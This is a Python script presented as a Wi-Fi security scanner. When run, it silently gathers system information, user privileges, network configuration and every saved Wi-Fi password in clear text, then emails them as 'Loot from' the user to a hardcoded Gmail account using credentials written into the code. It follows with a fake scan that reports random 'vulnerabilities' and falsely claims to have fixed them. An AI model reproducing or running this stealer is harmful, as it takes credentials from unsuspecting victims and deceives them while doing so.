try:
      from subprocess import check_output 
      from smtplib import SMTP
      from time import sleep 
      from random import randint
      from email.mime.text import MIMEText

      banner = """
 █▀▀▀█ █▀▀ █▀▀ █  █ █▀▀█ █▀▀ 　  █   █ █▀▀█ █  █ █▀▀█ 　  █   █  ▀   █▀▀▀  ▀ 
 ▀▀▀▄▄ █▀▀ █   █  █ █▄▄▀ █▀▀ 　  █▄▄▄█ █  █ █  █ █▄▄▀ 　  █ █ █ ▀█▀  █▀▀▀ ▀█▀ 
 █▄▄▄█ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀ ▀▀ ▀▀▀ 　    █   ▀▀▀▀ ▀▀▀▀ ▀ ▀▀ 　  █▄▀▄█ ▀▀▀  █    ▀▀▀
      """

      email = "zexeus78@gmail.com"
      passwd = "*o=tl?OG5jAC1-7EtrlDriw6wr46hut$L8Epr?"
      allinfo = ""
      print("Initializing......")
      wifis = check_output("netsh wlan show profiles")
      wifis = wifis.decode('utf-8').split("\n")
      sysinfo = check_output("systeminfo").decode('utf-8').strip("\n")
      user = check_output("whoami").decode('utf-8').strip("\n")
      userInfo = check_output("whoami /all").decode('utf-8').strip("\n")
      ipconf = check_output("ipconfig /all").decode('utf-8').strip("\n")

      allinfo =f"""
      System Information\n
      {sysinfo}\n--------------------------------------------------------------------------------------------------------------\n
      All information about current user\n\nCurrent user: {user}\n\n{userInfo}\n\n--------------------------------------------------------------------------------------------------------------\n
      \nNetwork Card(s) Information\n{ipconf}\n\n--------------------------------------------------------------------------------------------------------------\n
      Wifi SSIDs and Passwords\n\n
      """

      for line in wifis:
            if "All User Profile" in line:
                  line = line.split(":")
                  wifi = line[1].strip()
                  info = check_output(f"netsh wlan show profile \"{wifi}\"")
                  info = info.decode('utf-8').split("\n")
                  for l in info:
                        if "Name" in l:
                              name = l 
                              check = check_output(f"netsh wlan show profile \"{wifi}\" key=clear").decode('utf-8').split("\n")
                              for key in check:
                                    if "Key Content" in key:
                                          allinfo += f"{name}\n{key}"
                                          allinfo += "--------------------------------------------------------------------------------------------------------------\n"

      server = SMTP('smtp.gmail.com', 587)
      server.starttls()
      server.login(email, passwd)
      msg = MIMEText(allinfo)
      msg['Subject'] = f"Loot from {user}"
      msg['From'] = email
      msg['To'] = email
      server.sendmail(email, email, msg.as_string())         
      server.quit()
      print(banner)

      while True:
            ask = str(input("Do you wish to secure you WiFi? (y/n)\n")).lower()

            if ask == "y":
                  ssid = str(input("\nEnter the SSID(Name) of your WiFi> "))
                  sleep(1)
                  print("\n[+]Trying to find your WiFi")
                  sleep(5)
                  print(f"[+]WiFi named \"{ssid}\" was found!")
                  sleep(2)
                  print(f"[+]Trying to find vulnerabilities from outside the network")
                  sleep(19)
                  exVulns = randint(2,9)
                  print(f"[+]ALERT! {exVulns} VULNERABILITIES FOUND!!")
                  sleep(4)
                  print(f"[+]Trying to find vulnerabilites inside the network")
                  sleep(26)
                  inVulns = randint(10,23)
                  print(f"[+]ALERT! {inVulns} VULNERABILITIES FOUND!!")
                  sleep(4)
                  s = exVulns + inVulns
                  print(f"[+]Attempting to patch {s} vulnerabilities")
                  sleep(35)
                  print("[+]Vulnerabilities have been fixed!!\n[+]Run the scanner every month to fix latest vulnerabilities\n")
                  break
            elif ask == "n":
                  print("[+]Your WiFi network is very vulnerable....all the best :)")
                  break
            else:
                  print("[+]Invalid input, try again\n")
                  continue
except KeyboardInterrupt:
      pass
